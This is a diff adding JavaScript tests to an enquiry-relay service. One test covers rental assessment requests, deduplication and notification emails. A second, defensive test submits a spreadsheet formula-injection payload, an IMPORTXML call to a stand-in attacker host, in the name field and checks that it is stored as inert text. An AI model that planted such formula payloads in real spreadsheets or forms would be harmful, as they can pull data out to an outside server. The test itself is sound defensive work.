@@ -520,6 +520,71 @@ test("public enquiry delivery attaches one verified PDF only to the customer and
   assert.equal(rows.length, 2);
 });
 
+test("rental assessment requests retain scope and authority, stay unbooked and dedupe retries", () => {
+  const { context, sent, rows } = relay();
+  const payload = {
+    ...comparison,
+    schemaVersion: "7",
+    reference: "AEA-20260824-12345678ABCD4ABC",
+    eventType: "direct_trade.project",
+    enquiry: "rental-assessment-request",
+    sourceJourney: "public-rental-assessment-request",
+    submissionFingerprint: "c".repeat(64),
+    name: "Jamie Customer",
+    requesterRole: "agent-property-manager",
+    agencyName: "Example Property Management",
+    customerUnitNumber: "Unit 4",
+    customerStreetAddress: "15 Example Street",
+    customerSuburb: "MELBOURNE",
+    customerState: "VIC",
+    postcode: "3000",
+    requestedOptionalModules: ["electrical_safety_check", "smoke_alarm_check"],
+    authorityConfirmed: true,
+    projectCategories: ["rental-inspection"],
+    directTradeTriage: {
+      status: "manual_review_required",
+      priority: "standard_review",
+      autoSend: false,
+      reviewFlags: ["booking_not_created"],
+    },
+  };
+
+  assert.equal(context.handleEnquiry_(payload).value, "ok");
+  assert.equal(sent.length, 2);
+  assert.match(sent[0].subject, /rental assessment request/i);
+  assert.match(sent[0].htmlBody, /not booked/i);
+  assert.match(sent[0].body, /no inspection or trade job has been booked or scheduled/i);
+  assert.match(sent[1].htmlBody, /before creating and assigning the TLink rental inspection job/i);
+  assert.match(sent[1].htmlBody, /Electrical safety check, Smoke alarm check/);
+  assert.equal(rows.length, 2);
+  const details = JSON.parse(rows[1][rows[0].indexOf("Details")]);
+  assert.equal(details.requesterRole, "agent-property-manager");
+  assert.equal(details.agencyName, "Example Property Management");
+  assert.deepEqual(Array.from(details.requestedOptionalModules), ["electrical_safety_check", "smoke_alarm_check"]);
+  assert.equal(details.authorityConfirmed, true);
+  assert.equal(details.customerStreetAddress, "15 Example Street");
+
+  assert.equal(context.handleEnquiry_(payload).value, "ok");
+  assert.equal(sent.length, 2);
+  assert.equal(rows.length, 2);
+  assert.throws(() => context.handleEnquiry_({
+    ...payload,
+    requestedOptionalModules: ["gas_safety_check"],
+    submissionFingerprint: "d".repeat(64),
+  }), /does not match its original submission/);
+});
+
+test("the relay stores formula-looking public text as inert Sheet text", () => {
+  const { context, rows } = relay();
+  const payload = {
+    ...publicPlanRelayPayload(),
+    reference: "AEA-20260824-FORMULAGUARD1234",
+    name: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
+  };
+  assert.equal(context.handleEnquiry_(payload).value, "ok");
+  assert.equal(rows[1][rows[0].indexOf("Name")], "'=IMPORTXML(\"https://attacker.example\", \"//x\")");
+});
+
 test("an externally managed customer plan email still creates the Sheet record and internal review email exactly once", () => {
   const { context, sent, rows } = relay();
   const payload = {
